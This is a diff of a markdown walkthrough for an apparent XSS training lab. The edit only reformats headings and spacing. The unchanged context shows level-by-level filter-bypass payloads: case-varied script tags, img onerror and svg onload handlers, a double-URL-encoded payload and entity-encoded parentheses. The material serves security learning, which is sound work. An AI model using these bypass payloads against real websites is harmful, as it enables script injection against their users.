@@ -11,9 +11,10 @@
 ### 00: Supposed to be safe
 
 ### 10: Basic HTML XSS
+
 Anything goes here, there is no protection
 
-### 11:
+### 11
 
 Here we introduced a filter to stop script and alert
 
@@ -23,7 +24,7 @@ Here we introduced a filter to stop script and alert
 <sCript>confirm()</sCript>
 ```
 
-### 12:
+### 12
 
 Here we added confirm to our filter
 
@@ -33,7 +34,7 @@ Here we added confirm to our filter
 <sCript>prompt()</sCript>
 ```
 
-### 13:
+### 13
 
 Here we put your input to lowercase before sanitising it, making `<sCript>prompt()</sCript>` no longer a valid bypass
 
@@ -41,7 +42,7 @@ Here we put your input to lowercase before sanitising it, making `<sCript>prompt
 <img src=x onerror=prompt()>
 ```
 
-### 14:
+### 14
 
 `>` seems to be stripped but we can still think of attacks without `>`
 
@@ -49,7 +50,7 @@ Here we put your input to lowercase before sanitising it, making `<sCript>prompt
 <svg onload=alert(1)//
 ```
 
-### 15:
+### 15
 
 `<` is blocked here but we are in luck because the target uses `html_entity_decode` on our input
 `<` can be replaced by `&lt;`
@@ -68,7 +69,7 @@ This means you will have to double encode your URL values:
 %253Csvg%2520o%256Eload%253Dalert%25281%2529%253E %2522%253E%253Csvg%2520o%256Eload%253Dalert%25281%2529%253E
 ```
 
-### 17:
+### 17
 
 Parenthesis are blocked BUT we can use the HTML entities
 
@@ -78,7 +79,8 @@ Parenthesis are blocked BUT we can use the HTML entities
 <svg onload=alert&#40;1&#41>
 ```
 
-### 20:
+### 20
+
 Your code is reflected between the HTML comments so you need to end them:
 
 `-->`
@@ -90,6 +92,7 @@ Then you can enter your text:
 ```
 
 ### 30: HTML tag attribute XSS
+
 We can see a new input tag appearing on the page upon submitting a value
 We can break out with
 
